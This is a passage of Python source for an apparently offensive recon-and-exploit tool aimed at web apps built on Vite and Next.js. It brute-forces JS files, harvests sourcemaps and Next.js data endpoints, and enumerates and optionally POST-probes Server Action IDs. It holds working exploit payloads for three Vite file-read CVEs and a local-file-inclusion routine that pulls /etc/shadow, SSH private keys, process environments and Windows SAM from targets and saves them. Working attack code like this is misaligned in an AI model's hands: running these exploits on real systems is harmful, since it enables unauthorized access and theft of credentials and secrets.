    sourcemaps_dir = domain_dir / "sourcemaps"
    sources_dir    = domain_dir / "sources"

    # --- Method 1: inline data URI in JS body ---
    mapping_url = extract_sourcemap_url(js_content)
    if mapping_url and mapping_url.startswith("data:"):
        map_data = extract_inline_map(mapping_url)
        if map_data:
            sourcemaps_dir.mkdir(parents=True, exist_ok=True)
            sources_dir.mkdir(parents=True, exist_ok=True)
            map_path = sourcemaps_dir / f"{js_filename}.map"
            map_path.write_text(json.dumps(map_data, ensure_ascii=False, indent=2))
            _map("inline", "data:...", map_path)
        return

    # --- Method 2: sourceMappingURL comment in JS body ---
    if mapping_url:
        resolved = resolve_map_url(js_url, mapping_url)
        if resolved:
            if await fetch_and_extract_map(resolved, js_filename, domain_dir, client, tag="map"):
                return

    # --- Method 3: SourceMap / X-SourceMap HTTP header ---
    header_map = extract_sourcemap_header(js_resp_headers)
    if header_map:
        resolved = resolve_map_url(js_url, header_map)
        if resolved:
            if await fetch_and_extract_map(resolved, js_filename, domain_dir, client, tag="hdr"):
                return

    # --- Method 4: brute {js_url}.map directly ---
    brute_map_url = js_url + ".map"
    await fetch_and_extract_map(brute_map_url, js_filename, domain_dir, client, tag="brute")




async def download_js_files(urls: list[str], domain_dir: Path, custom_headers: dict | None = None):
    js_dir = domain_dir / "js"
    js_dir.mkdir(parents=True, exist_ok=True)

    downloaded: list[tuple[str, bytes]] = []

    async def fetch(client: httpx.AsyncClient, url: str):
        try:
            r = await client.get(url, timeout=_T_NORMAL, follow_redirects=True)
            if r.status_code == 200:
                path = urlparse(url).path.lstrip("/").replace("/", "_")
                (js_dir / path).write_bytes(r.content)
                return url, r.content, r.headers
        except Exception:
            pass
        return None, None, None

    req_headers = {"User-Agent": UA}
    if custom_headers:
        req_headers.update(custom_headers)
    async with httpx.AsyncClient(verify=False, headers=req_headers) as client:
        try:
            async with asyncio.timeout(90):
                results = await asyncio.gather(*[fetch(client, u) for u in urls])
        except asyncio.TimeoutError:
            results = []
            _hit("Download timeout — skipping remaining files")
        ok = [(url, body, hdrs) for url, body, hdrs in results if url]
        _ok(f"Downloaded {_c(_C_GREEN, str(len(ok)))}/{len(urls)} JS file(s) → {_c(_C_DIM, str(js_dir))}")

        if ok:
            try:
                async with asyncio.timeout(120):
                    await asyncio.gather(*[
                        process_sourcemap(js_url, js_content, js_headers, domain_dir, client)
                        for js_url, js_content, js_headers in ok
                    ])
            except asyncio.TimeoutError:
                _hit("Sourcemap processing timeout — skipping")




async def process_subdomain(
    raw: str,
    output_dir: Path,
    wordlist: list[str],
    timeout: int,
    semaphore: asyncio.Semaphore,
    verbose: bool,
    download: bool,
    custom_headers: dict | None = None,
    proxy: str | None = None,
    brute_concurrency: int = 20,
    brute_delay: float = 0.0,
    pw_executor=None,
    crawl_mode: str = "none",
    crawl_depth: int = 10,
    probe_actions: bool = False,
):
    url = normalize(raw)
    if not url:
        return

    slug = domain_slug(url)
    async with semaphore:
        _debug_event("B", "domain processing started", {"domain": url, "slug": slug, "crawl_mode": crawl_mode})
        _PREFIX_VAR.set(slug)
        print(f"{_c(_C_DIM, '[' + slug + ']')} {_C_BOLD}[*]{_C_RESET} {url}")

        # Stage 1 — collect JS via headless browser
        try:
            js_urls, page_build_id, pw_cookies, is_cloudflare, page_loaded, page_actions = await collect_js_playwright(
                url, timeout=timeout, custom_headers=custom_headers,
                executor=pw_executor,
                crawl_mode=crawl_mode,
                crawl_depth=crawl_depth,
            )
        except Exception as e:
            print(f"{_pfx()}{_c(_C_RED, "[!]")} Playwright error: {e}", file=sys.stderr)
            js_urls, page_build_id, pw_cookies, is_cloudflare, page_loaded, page_actions = [], None, {}, False, False, []

        if is_cloudflare:
            print(f"{_pfx()}{_c(_C_YELLOW, "[cf]")} Cloudflare detected — brute disabled, using browser cookies for downloads")

        if verbose:
            for u in js_urls:
                print(f"{_pfx()}{_c(_C_CYAN, "[js]")} {u}")

        _ok(f"Found {_c(_C_GREEN, str(len(js_urls)))} JS file(s)")

        # Stage 2 — brute all dirs from target host only (skip CDNs)
        target_host = urlparse(url).netloc

        def _root_domain(host: str) -> str:
            """Extract root domain (TLD+1): api.odrex.ua → odrex.ua"""
            # Strip port if present
            host = host.split(":")[0]
            parts = host.split(".")
            # Handle common multi-part TLDs: co.uk, com.ua, org.ua etc.
            if len(parts) >= 3 and len(parts[-2]) <= 3:
                return ".".join(parts[-3:])
            return ".".join(parts[-2:]) if len(parts) >= 2 else host

        target_root = _root_domain(target_host)
        target_js = [u for u in js_urls if _root_domain(urlparse(u).netloc) == target_root]
        base_dirs = list({base_dir_of(u) for u in target_js})

        bruted: list[str] = []
        if base_dirs and not is_cloudflare:
            _info(f"Bruting {len(wordlist)} names in {len(base_dirs)} dir(s)…")
            bruted = await brute_js_names(base_dirs, wordlist,
                                              concurrency=brute_concurrency,
                                              delay=brute_delay,
                                              proxy=proxy,
                                              custom_headers=custom_headers)
            # Exclude already-known URLs
            bruted = [u for u in bruted if u not in js_urls]
            if verbose:
                for u in bruted:
                    print(f"  [brute] {u}")
            _ok(f"Brute found {_c(_C_YELLOW if bruted else _C_DIM, str(len(bruted)))} new JS file(s)")
        elif is_cloudflare and base_dirs:
            print(f"{_pfx()}{_c(_C_DIM, "[-] Brute skipped (Cloudflare)")}")

        # Save — only target-domain JS in js_files.txt
        js_f, br_f = save_results(output_dir, slug, target_js, bruted)
        print(f"{_pfx()}{_c(_C_DIM, "[>]")} {js_f}")
        print(f"{_pfx()}{_c(_C_DIM, "[>]")} {br_f}")

        # Save Cloudflare marker for manual review
        if is_cloudflare:
            cf_marker = output_dir / slug / "CLOUDFLARE.txt"
            cf_marker.write_text(
                f"Cloudflare detected on {url}\n"
                f"JS files collected: {len(target_js)}\n"
                f"Brute: skipped\n"
                f"Manual review needed: visit {url} in browser and check JS manually\n",
                encoding="utf-8"
            )
            print(f"{_pfx()}{_c(_C_YELLOW, "[cf]")} Marker saved → {_c(_C_DIM, str(cf_marker))}")

        # Download if requested
        if download:
            all_js = list(set(target_js + bruted))
            # Merge Playwright cookies into headers for Cloudflare-protected sites
            dl_headers = dict(custom_headers or {})
            if pw_cookies:
                existing_cookie = dl_headers.get("Cookie", "")
                new_cookies = "; ".join(f"{k}={v}" for k, v in pw_cookies.items())
                dl_headers["Cookie"] = (existing_cookie + "; " + new_cookies).strip("; ") if existing_cookie else new_cookies
            await download_js_files(all_js, output_dir / slug, custom_headers=dl_headers)

        # Next.js: buildId + routes + data endpoints
        req_headers = {"User-Agent": UA}
        if custom_headers:
            req_headers.update(custom_headers)
        # Inject Playwright cookies so httpx can reach CF-protected endpoints
        if pw_cookies:
            existing_cookie = req_headers.get("Cookie", "")
            new_cookies = "; ".join(f"{k}={v}" for k, v in pw_cookies.items())
            req_headers["Cookie"] = (existing_cookie + "; " + new_cookies).strip("; ") if existing_cookie else new_cookies
        async with httpx.AsyncClient(verify=False, headers=req_headers) as client:
            try:
                async with asyncio.timeout(120):
                    await process_nextjs(url, target_js + bruted, output_dir / slug, client,
                                         hint_build_id=page_build_id,
                                         wordlist=wordlist)
            except asyncio.TimeoutError:
                print(f"{_pfx()}{_c(_C_YELLOW, '[next] timeout — skipping')}")

            # Vite CVE detection + LFI
            try:
                async with asyncio.timeout(90):
                    await process_vite(url, target_js + bruted, output_dir / slug, client)
            except asyncio.TimeoutError:
                print(f"{_pfx()}{_c(_C_YELLOW, '[vite] timeout — skipping')}")

            # ── Next.js Server Actions (html + js + sources + manifests) ─────
            try:
                async with asyncio.timeout(180):
                    sa_info = await process_server_actions(
                        domain_dir   = output_dir / slug,
                        base_url     = url,
                        client       = client,
                        page_actions = page_actions,
                        build_id     = page_build_id,
                        probe        = probe_actions,
                    )
                if sa_info["detected"]:
                    _ok(f"Server Actions: {_c(_C_GREEN, str(sa_info['count']))} action id(s) "
                        f"{_c(_C_DIM, '(' + ', '.join(f'{k}:{v}' for k, v in sa_info['methods'].items() if v) + ')')} "
                        f"→ {_c(_C_DIM, str(output_dir / slug / 'server_actions.json'))}")
            except asyncio.TimeoutError:
                print(f"{_pfx()}{_c(_C_YELLOW, '[actions] timeout — skipping')}")

        # ── Aggregate all results into a single domain_report.json ───────────
        report_path = save_domain_report(
            domain_dir    = output_dir / slug,
            base_url      = url,
            js_urls       = target_js,
            bruted        = bruted,
            is_cloudflare = is_cloudflare,
            status        = "blocked" if is_cloudflare else ("processed" if page_loaded else "error"),
        )
        _debug_event("B", "domain report saved", {"domain": url, "status": "blocked" if is_cloudflare else ("processed" if page_loaded else "error"), "js_count": len(target_js), "brute_count": len(bruted)})
        _ok(f"Report → {_c(_C_DIM, str(report_path))}")


async def process_subdomain_safe(*args, **kwargs):
    raw = args[0] if args else kwargs.get("raw", "")
    output_dir = args[1] if len(args) > 1 else kwargs["output_dir"]
    try:
        return await process_subdomain(*args, **kwargs)
    except asyncio.CancelledError:
        raise
    except Exception as exc:
        url = normalize(raw)
        if url:
            domain_dir = output_dir / domain_slug(url)
            domain_dir.mkdir(parents=True, exist_ok=True)
            save_domain_report(domain_dir, url, [], [], False, "error")
            _debug_event("B", "domain task exception and error report saved", {"domain": url, "error": type(exc).__name__})
        print(f"{_pfx()}{_c(_C_RED, '[!]')} Domain error: {exc}", file=sys.stderr)




# ─── Vite CVE detection ───────────────────────────────────────────────────────

# Linux paths
VITE_LFI_WORDLIST_LINUX = [
    "/etc/passwd", "/etc/shadow", "/etc/hosts", "/etc/hostname",
    "/etc/ssh/sshd_config", "/root/.ssh/id_rsa", "/root/.ssh/authorized_keys",
    "/root/.bash_history", "/root/.bashrc", "/root/.profile",
    "/proc/self/environ", "/proc/self/cmdline",
    "/etc/mysql/my.cnf", "/etc/my.cnf",
    "/etc/php.ini", "/usr/local/etc/php.ini",
    "/etc/apache2/apache.conf", "/usr/local/apache/conf/httpd.conf",
    "/etc/nginx/nginx.conf",
    "/var/log/apache2/access.log", "/var/log/nginx/access.log",
    "/var/log/auth.log",
]

# Windows paths — used when Windows server detected
VITE_LFI_WORDLIST_WINDOWS = [
    "/C:/windows/win.ini",
    "/C:/windows/system32/drivers/etc/hosts",
    "/C:/inetpub/wwwroot/.env",
    "/C:/inetpub/wwwroot/web.config",
    "/C:/inetpub/wwwroot/.env.local",
    "/C:/inetpub/wwwroot/.env.production",
    "/C:/inetpub/wwwroot/vite.config.ts",
    "/C:/inetpub/wwwroot/vite.config.js",
    "/C:/inetpub/wwwroot/package.json",
    "/C:/Users/Administrator/.ssh/id_rsa",
    "/C:/boot.ini",
    "/C:/windows/repair/sam",
    "/C:/windows/php.ini",
    "/C:/ProgramData/MySQL/MySQL Server 8.0/my.ini",
]

# Combined — Linux first, Windows appended
VITE_LFI_WORDLIST = VITE_LFI_WORDLIST_LINUX


def get_vite_root_path(js_urls):
    for u in js_urls:
        m = re.search(r"(.*?)/@vite/client", u)
        if m:
            parsed = urlparse(u)
            path = parsed.path
            root = path.replace("/@vite/client", "")
            return root if root else "/"
    return None


async def probe_cve(client, base_url, root_path):
    base = base_url.rstrip("/")
    root = root_path.rstrip("/")
    results = {}

    probes = {
        "CVE-2025-30208": [
            # Linux
            f"{base}{root}/etc/passwd?import&raw??",
            f"{base}{root}/@fs/etc/passwd?import&raw??",
            # Windows
            f"{base}{root}/C://windows/win.ini?import&raw??",
            f"{base}{root}/@fs/C://windows/win.ini?import&raw??",
        ],
        "CVE-2025-31125": [
            # Linux
            f"{base}{root}/etc/passwd?import&?inline=1.wasm?init",
            f"{base}{root}/@fs/etc/passwd?import&?inline=1.wasm?init",
            # Windows
            f"{base}{root}/C://windows/win.ini?import&?inline=1.wasm?init",
            f"{base}{root}/@fs/C://windows/win.ini?import&?inline=1.wasm?init",
        ],
        "CVE-2025-31486": [
            # Linux
            f"{base}{root}/x/x/x/vite-project/?/../../../../../etc/passwd?import&raw??",
            f"{base}{root}/@fs/x/x/x/vite-project/?/../../../../../etc/passwd?import&raw??",
            # Windows
            f"{base}{root}/x/x/x/vite-project/?/../../../../../C://windows/win.ini?import&raw??",
            f"{base}{root}/@fs/x/x/x/vite-project/?/../../../../../C://windows/win.ini?import&raw??",
        ],
    }

    def is_success_30208(r): return "export default" in r.text
    def is_success_31125(r): return "data:application/octet-stream;base64" in r.text
    def is_success_31486(r): return "export default" in r.text

    markers = {
        "CVE-2025-30208": is_success_30208,
        "CVE-2025-31125": is_success_31125,
        "CVE-2025-31486": is_success_31486,
    }

    RESPONSE_MARKERS = {
        "CVE-2025-30208": "export default",
        "CVE-2025-31125": "data:application/octet-stream;base64",
        "CVE-2025-31486": "export default",
    }

    SEP_FROM_URL = {
        0: "",      # Linux, no /@fs
        1: "/@fs",  # Linux, with /@fs
        2: "",      # Windows, no /@fs
        3: "/@fs",  # Windows, with /@fs
    }
    IS_WINDOWS = {0: False, 1: False, 2: True, 3: True}

    for cve, urls in probes.items():
        results[cve] = {"confirmed": False}
        for idx, probe_url in enumerate(urls):
            try:
                r = await client.get(probe_url, timeout=_T_FAST, follow_redirects=True)
                if r.status_code == 200 and markers[cve](r):
                    sep = SEP_FROM_URL.get(idx, "")
                    is_win = IS_WINDOWS.get(idx, False)
                    results[cve] = {
                        "confirmed":       True,
                        "payload":         probe_url,
                        "sep":             sep,
                        "is_windows":      is_win,
                        "response_marker": RESPONSE_MARKERS[cve],
                        "root_path":       root_path,
                    }
                    break
            except Exception:
                continue

    return results


def extract_lfi_content(cve, text):
    if cve in ("CVE-2025-30208", "CVE-2025-31486"):
        m = re.search(r'export default\s+"(.*?)"', text, re.DOTALL)
        if m:
            return m.group(1).replace("\\n", "\n").replace("\\t", "\t")
        return text
    elif cve == "CVE-2025-31125":
        m = re.search(r"base64,([A-Za-z0-9+/=]+)", text)
        if m:
            import base64
            try:
                return base64.b64decode(m.group(1)).decode("utf-8", errors="replace")
            except Exception:
                return m.group(1)
    return text


def build_lfi_urls(base, root, cve, sensitive_path):
    sep_variants = ["", "/@fs"]
    if cve == "CVE-2025-30208":
        return [f"{base}{root}{sep}{sensitive_path}?import&raw??" for sep in sep_variants]
    elif cve == "CVE-2025-31125":
        return [f"{base}{root}{sep}{sensitive_path}?import&?inline=1.wasm?init" for sep in sep_variants]
    elif cve == "CVE-2025-31486":
        return [f"{base}{root}{sep}/x/x/x/vite-project/?/../../../../../{sensitive_path.lstrip('/')}?import&raw??" for sep in sep_variants]
    return []


def is_lfi_success(cve, r):
    if cve in ("CVE-2025-30208", "CVE-2025-31486"):
        return r.status_code == 200 and "export default" in r.text
    elif cve == "CVE-2025-31125":
        return r.status_code == 200 and "data:application/octet-stream;base64" in r.text
    return False


async def exploit_vite_lfi(client, base_url, root_path, cve, domain_dir, is_windows: bool = False):
    base = base_url.rstrip("/")
    root = root_path.rstrip("/")
    lfi_dir = domain_dir / "vite_lfi"
    lfi_dir.mkdir(exist_ok=True)
    found = []
    sem = asyncio.Semaphore(5)
    wordlist = VITE_LFI_WORDLIST_WINDOWS if is_windows else VITE_LFI_WORDLIST_LINUX

    async def probe(sensitive_path):
        async with sem:
            for url in build_lfi_urls(base, root, cve, sensitive_path):
                try:
                    r = await client.get(url, timeout=_T_FAST, follow_redirects=True)
                    if is_lfi_success(cve, r):
                        content = extract_lfi_content(cve, r.text)
                        fname = sensitive_path.lstrip("/").replace("/", "_")
                        (lfi_dir / fname).write_text(content, encoding="utf-8")
                        found.append(sensitive_path)
                        label = f"{_C_RED}{_C_BOLD}[lfi]{_C_RESET}"
                        print(f"{_pfx()}{label} {_c(_C_RED, sensitive_path)} -> {_c(_C_DIM, str(lfi_dir / fname))}")
                        break
                except Exception:
                    continue

    await asyncio.gather(*[probe(p) for p in wordlist])
    return found


async def process_vite(base_url, js_urls, domain_dir, client):
    root_path = get_vite_root_path(js_urls)
    if not root_path:
        return

    print(f"{_pfx()}{_c(_C_CYAN + _C_BOLD, '[vite]')} Detected — root: {_c(_C_YELLOW, root_path)}")

    cve_results = await probe_cve(client, base_url, root_path)
    confirmed = [cve for cve, info in cve_results.items() if info.get("confirmed")]

    if not confirmed:
        print(f"{_pfx()}{_c(_C_DIM, '[-] No Vite CVEs confirmed')}")
        vite_info = {
            "root_path": root_path,
            "base_url":  base_url,
            "confirmed": {},
            "lfi_files": [],
        }
        (domain_dir / "vite_info.json").write_text(json.dumps(vite_info, indent=2, ensure_ascii=False), encoding="utf-8")
        return

    for cve in confirmed:
        info = cve_results[cve]
        os_tag = "Windows" if info.get("is_windows") else "Linux"
        print(f"{_pfx()}{_c(_C_RED + _C_BOLD, '[CVE]')} {_c(_C_RED, cve)} CONFIRMED ({os_tag})")
        print(f"{_pfx()}    payload: {_c(_C_DIM, info['payload'])}")
        print(f"{_pfx()}    sep:     {_c(_C_DIM, info['sep'] or 'none')}")

    best_cve = confirmed[0]
    print(f"{_pfx()}{_c(_C_YELLOW, f'[lfi] Exploiting {best_cve} — trying {len(VITE_LFI_WORDLIST)} paths...')}")

    try:
        async with asyncio.timeout(60):
            is_win = cve_results[best_cve].get("is_windows", False)
            found = await exploit_vite_lfi(client, base_url, root_path, best_cve, domain_dir, is_windows=is_win)
    except asyncio.TimeoutError:
        found = []
        print(f"{_pfx()}{_c(_C_YELLOW, '[lfi] timeout')}")

    if found:
        _ok(f"LFI: {_c(_C_RED, str(len(found)))} file(s) read -> {_c(_C_DIM, str(domain_dir / 'vite_lfi'))}")

    # Build confirmed dict with full details
    confirmed_details = {
        cve: cve_results[cve]
        for cve in confirmed
    }

    vite_info = {
        "root_path":  root_path,
        "base_url":   base_url,
        "confirmed":  confirmed_details,
        "lfi_files":  found,
    }
    (domain_dir / "vite_info.json").write_text(json.dumps(vite_info, indent=2, ensure_ascii=False), encoding="utf-8")


# ─── Next.js buildManifest + data endpoints ──────────────────────────────────

def extract_build_id(js_urls: list[str]) -> str | None:
    """Extract buildId from _buildManifest.js or _ssgManifest.js URL."""
    for u in js_urls:
        m = re.search(r"/_next/static/([^/]+)/_(buildManifest|ssgManifest)\.js", u)
        if m:
            return m.group(1)
    return None


async def fetch_build_manifest(base_url: str, build_id: str,
                                client: httpx.AsyncClient) -> dict | None:
    """Download and parse _buildManifest.js → {route: [chunks]}."""
    url = f"{base_url}/_next/static/{build_id}/_buildManifest.js"
    try:
        r = await client.get(url, timeout=_T_FAST, follow_redirects=True)
        if r.status_code != 200:
            return None
        text = r.text
        # self.__BUILD_MANIFEST={...} or self.__BUILD_MANIFEST_CB&&...
        m = re.search(r"self\.__BUILD_MANIFEST\s*=\s*(\{.*?\})\s*[,;]", text, re.DOTALL)
        if not m:
            return None
        # Replace JS syntax to valid JSON
        raw = m.group(1)
        raw = re.sub(r",\s*}", "}", raw)   # trailing commas
        raw = re.sub(r",\s*]", "]", raw)
        return json.loads(raw)
    except Exception:
        return None


def extract_routes(manifest: dict) -> list[str]:
    """Extract page routes from buildManifest (keys starting with /)."""
    routes = []
    for key in manifest:
        if key.startswith("/") and not key.startswith("/_"):
            routes.append(key)
    return sorted(routes)


async def probe_next_data(base_url: str, build_id: str, routes: list[str],
                           domain_dir: Path, client: httpx.AsyncClient):
    """
    Probe /_next/data/{buildId}/{route}.json for each route.
    Save responses that return real JSON data.
    """
    data_dir = domain_dir / "next_data"
    data_dir.mkdir(exist_ok=True)

    hits  = 0
    total = len(routes)
    sem   = asyncio.Semaphore(10)

    _info(f"Probing {total} /_next/data/ route(s)…")

    async def probe(route: str):
        nonlocal hits
        path = route.strip("/") or "index"
        url  = f"{base_url}/_next/data/{build_id}/{path}.json"
        async with sem:
            try:
                r = await client.get(url, timeout=_T_FAST, follow_redirects=True)
                if r.status_code != 200:
                    return
                ct = r.headers.get("content-type", "")
                if "json" not in ct:
                    return
                try:
                    data = r.json()
                except Exception:
                    return
                props = data.get("pageProps", {})
                if not props:
                    return
                fname = path.replace("/", "_") + ".json"
                (data_dir / fname).write_text(
                    json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8"
                )
                hits += 1
                label = f"{_C_GREEN}{_C_BOLD}[data]{_C_RESET}"
                print(f"{_pfx()}{label} {_c(_C_GREEN, url)} → {_c(_C_DIM, str(data_dir / fname))}")
            except Exception:
                pass

    # Global timeout for entire probing stage
    GLOBAL_TIMEOUT = 60  # seconds
    BATCH = 50
    try:
        async with asyncio.timeout(GLOBAL_TIMEOUT):
            for i in range(0, total, BATCH):
                batch = routes[i:i + BATCH]
                await asyncio.gather(*[probe(r) for r in batch])
                pct = min(i + BATCH, total)
                print(f"  {_c(_C_DIM, f'[next/data] {pct}/{total}')}", end="\r")
            print()
    except asyncio.TimeoutError:
        print(f"{_pfx()}{_c(_C_YELLOW, f'[next/data] timeout after {GLOBAL_TIMEOUT}s ({hits} hit(s) so far)')}")

    if hits:
        _ok(f"Next.js data: {_c(_C_GREEN, str(hits))} endpoint(s) with data → {_c(_C_DIM, str(data_dir))}")
    else:
        print(f"{_pfx()}{_c(_C_DIM, '[-] No /_next/data endpoints returned data')}")


def grep_build_id_from_files(domain_dir: Path) -> str | None:
    """Grep downloaded JS files for buildId:"..." pattern."""
    js_dir = domain_dir / "js"
    if not js_dir.exists():
        return None
    pattern = re.compile(r"""["']buildId["']\s*:\s*["']([a-zA-Z0-9_-]{8,})["']""")
    for js_file in js_dir.rglob("*.js"):
        try:
            text = js_file.read_text(encoding="utf-8", errors="replace")
            m = pattern.search(text)
            if m:
                return m.group(1)
        except Exception:
            continue
    return None


async def process_nextjs(base_url: str, js_urls: list[str],
                          domain_dir: Path, client: httpx.AsyncClient,
                          hint_build_id: str | None = None,
                          wordlist: list[str] | None = None):
    """Full Next.js pipeline: buildId → routes → data probing.
    buildId is resolved from 3 sources in priority order:
      1. __NEXT_DATA__ from page HTML (most reliable)
      2. _buildManifest.js URL pattern
      3. grep in downloaded JS content
    """
    # Source 1: from __NEXT_DATA__ via Playwright
    build_id = hint_build_id

    # Source 2: from _buildManifest.js URL
    if not build_id:
        build_id = extract_build_id(js_urls)

    # Source 3: grep JS files on disk for buildId:"..."
    if not build_id:
        build_id = grep_build_id_from_files(domain_dir)

    if not build_id:
        return

    source = "page" if hint_build_id else ("url" if extract_build_id(js_urls) else "grep")

    print(f"{_pfx()}{_c(_C_CYAN + _C_BOLD, '[next]')} buildId: {_c(_C_YELLOW, build_id)} {_c(_C_DIM, f'(via {source})')}")

    manifest = await fetch_build_manifest(base_url, build_id, client)

    if manifest:
        routes = extract_routes(manifest)
        routes_file = domain_dir / "routes.txt"
        routes_file.write_text("\n".join(routes) + "\n", encoding="utf-8")
        _ok(f"Routes: {_c(_C_GREEN, str(len(routes)))} found → {_c(_C_DIM, str(routes_file))}")
        if routes:
            for r in routes[:5]:
                print(f"  {_c(_C_DIM, '  ' + r)}")
            if len(routes) > 5:
                print(f"  {_c(_C_DIM, f'  ... and {len(routes)-5} more')}")
        manifest_source = "buildManifest"
    else:
        wl = wordlist if wordlist else NEXT_DATA_WORDLIST
        print(f"{_pfx()}{_c(_C_DIM, f'[-] _buildManifest unavailable — bruting {len(wl)} name(s) from wordlist')}")
        routes = []
        for name in wl:
            routes.append("/" + name)
        for a in wl[:20]:
            for b in wl[:20]:
                if a != b:
                    routes.append(f"/{a}/{b}")
        manifest_source = "wordlist_brute"

    # Save next_info.json
    next_info = {
        "build_id":     build_id,
        "source":       source,
        "manifest":     manifest_source,
        "base_url":     base_url,
        "data_base":    f"{base_url}/_next/data/{build_id}/",
        "manifest_url": f"{base_url}/_next/static/{build_id}/_buildManifest.js",
        "routes":       routes if manifest else [],
    }
    info_file = domain_dir / "next_info.json"
    info_file.write_text(json.dumps(next_info, indent=2, ensure_ascii=False), encoding="utf-8")
    _ok(f"Next.js info saved → {_c(_C_DIM, str(info_file))}")

    await probe_next_data(base_url, build_id, routes, domain_dir, client)


MANIFEST_PATHS = [
    "/_next/static/{bid}/server-reference-manifest.json",
    "/_next/static/{bid}/app-build-manifest.json",
    "/server-reference-manifest.json",
]
MANIFEST_CHUNK_LIMIT = 80


async def _fetch_next_manifests(base_url: str, build_id: str | None, client) -> dict:
    """Try to download Next.js server-reference / app-build manifests (usually not served)."""
    found: dict[str, dict] = {}
    for tpl in MANIFEST_PATHS:
        if "{bid}" in tpl and not build_id:
            continue
        url = base_url.rstrip("/") + (tpl.format(bid=build_id) if "{bid}" in tpl else tpl)
        try:
            r = await client.get(url, timeout=_T_FAST, follow_redirects=True)
            if r.status_code != 200 or "json" not in r.headers.get("content-type", ""):
                continue
            data = r.json()
            if isinstance(data, dict):
                found[url] = data
        except Exception:
            continue
    return found


def _scan_server_reference_manifest(url: str, data: dict, into: dict) -> int:
    """Extract action ids from server-reference-manifest.json ({node:{id:{...}}, edge:{...}})."""
    n = 0
    for layer, entries in (data or {}).items():
        if layer not in ("node", "edge", "middleware") or not isinstance(entries, dict):
            continue
        for action_id in entries.keys():
            if re.fullmatch(r"[A-Za-z0-9_\-]{16,80}", action_id or "") and action_id not in into:
                into[action_id] = {
                    "id": action_id, "source": "manifest", "file": url,
                    "pattern": "server-reference-manifest", "context": layer,
                }
                n += 1
    return n


async def _enum_and_scan_chunks(base_url: str, manifest: dict, into: dict,
                                signals: dict, client) -> int:
    """Fetch every JS chunk listed in app-build-manifest.json and scan it."""
    files: set = set()
    if isinstance(manifest, dict):
        for chunk_list in (manifest.get("pages") or {}).values():
            if isinstance(chunk_list, list):
                files.update(c for c in chunk_list if isinstance(c, str))
        files.update(c for c in (manifest.get("rootMainFiles") or []) if isinstance(c, str))
    files = sorted(f for f in files if f.endswith(".js"))[:MANIFEST_CHUNK_LIMIT]
    if not files:
        return 0

    base = base_url.rstrip("/") + "/_next/"
    sem = asyncio.Semaphore(10)

    async def one(chunk: str):
        async with sem:
            try:
                r = await client.get(base + chunk.lstrip("/"), timeout=_T_NORMAL, follow_redirects=True)
                if r.status_code == 200:
                    _scan_server_actions_text(r.text, "chunk_enum", chunk, into, signals)
            except Exception:
                pass

    await asyncio.gather(*[one(c) for c in files])
    return len(files)


async def _probe_server_actions(base_url: str, action_ids: list[str], client) -> list:
    """
    Actively confirm action ids: POST the page with a Next-Action header.
    NOTE: may execute the action server-side — only run when explicitly enabled.
    """
    sem = asyncio.Semaphore(5)

    async def one(action_id: str) -> dict:
        async with sem:
            headers = {"Next-Action": action_id, "Content-Type": "text/plain;charset=UTF-8"}
            try:
                r = await client.post(base_url, headers=headers, content="[]",
                                      timeout=_T_FAST, follow_redirects=False)
            except Exception as e:
                return {"id": action_id, "valid": None, "error": str(e)}
            body = r.text[:4000].lower()
            hdrs = {k.lower(): v for k, v in r.headers.items()}
            if "failed to find server action" in body:
                return {"id": action_id, "valid": False, "status": r.status_code}
            if r.status_code in (200, 201, 303) or any(h.startswith("x-action") for h in hdrs):
                return {"id": action_id, "valid": True, "status": r.status_code,
                        "x_action_redirect": hdrs.get("x-action-redirect")}
            return {"id": action_id, "valid": None, "status": r.status_code}

    return list(await asyncio.gather(*[one(a) for a in action_ids]))


async def process_server_actions(
    domain_dir: Path,
    base_url: str,
    client,
    page_actions: list | None = None,
    build_id: str | None = None,
    probe: bool = False,
) -> dict:
    """
    Collect Next.js Server Action IDs from every available source:
      - rendered HTML / flight data (from Playwright)      → html
      - downloaded JS chunks        (domain_dir/js)        → js
      - restored sources            (domain_dir/sources)   → sources (+ "use server" modules)
      - /_next/data responses       (domain_dir/next_data) → next_data
      - Next.js manifests           (server-reference)     → manifest
      - chunks from app-build-manifest                     → chunk_enum
      - active POST confirmation (opt-in)                  → probe
    Writes server_actions.json and returns its contents.
    """
    actions: dict[str, dict] = {}
    signals: dict[str, int] = {}
    modules: dict[str, dict] = {}
    methods: dict[str, int] = {}

    for rec in (page_actions or []):
        if rec.get("id") and rec["id"] not in actions:
            actions[rec["id"]] = rec
    if actions:
        methods["html"] = len(actions)

    def _scan_dir(directory: Path, source: str, suffixes: tuple) -> int:
        if not directory.exists():
            return 0
        hits = 0
        for f in sorted(directory.rglob("*")):
            if not f.is_file() or (suffixes and f.suffix.lower() not in suffixes):
                continue
            try:
                hits += _scan_server_actions_text(
                    f.read_text(encoding="utf-8", errors="replace"),
                    source, str(f.relative_to(domain_dir)), actions, signals, modules,
                )
            except Exception:
                pass
        return hits

    before = len(actions); _scan_dir(domain_dir / "js",        "js",        (".js", ".mjs", ".cjs"));        methods["js"] = len(actions) - before
    before = len(actions); _scan_dir(domain_dir / "sources",   "sources",   (".js", ".jsx", ".ts", ".tsx", ".mjs", ".cjs")); methods["sources"] = len(actions) - before
    before = len(actions); _scan_dir(domain_dir / "next_data", "next_data", (".json",));                       methods["next_data"] = len(actions) - before

    # ── Manifests (server-reference / app-build) ─────────────────────────────
    manifest_urls: list[str] = []
    try:
        manifests = await _fetch_next_manifests(base_url, build_id, client)
    except Exception:
        manifests = {}
    for url, data in manifests.items():
        manifest_urls.append(url)
        if "server-reference-manifest" in url:
            before = len(actions)
            _scan_server_reference_manifest(url, data, actions)
            methods["manifest"] = methods.get("manifest", 0) + (len(actions) - before)
        if "app-build-manifest" in url:
            try:
                fetched = await _enum_and_scan_chunks(base_url, data, actions, signals, client)
                if fetched:
                    methods["chunk_enum"] = methods.get("chunk_enum", 0) + fetched
            except Exception:
                pass

    # ── Active confirmation (opt-in) ─────────────────────────────────────────
    probes: list[dict] = []
    if probe and actions:
        try:
            probes = await _probe_server_actions(base_url, sorted(actions), client)
            for p in probes:
                if p.get("id") in actions and p.get("valid") is not None:
                    actions[p["id"]]["valid"] = p["valid"]
            methods["probe"] = sum(1 for p in probes if p.get("valid"))
        except Exception:
            probes = []

    info = {
        "base_url": base_url,
        "build_id": build_id,
        "detected": bool(actions),
        "count":    len(actions),
        "methods":  methods,
        "signals":  signals,
        "manifests": manifest_urls,
        "modules":  [{"file": f, "exports": m["exports"]} for f, m in sorted(modules.items())],
        "probes":   probes,
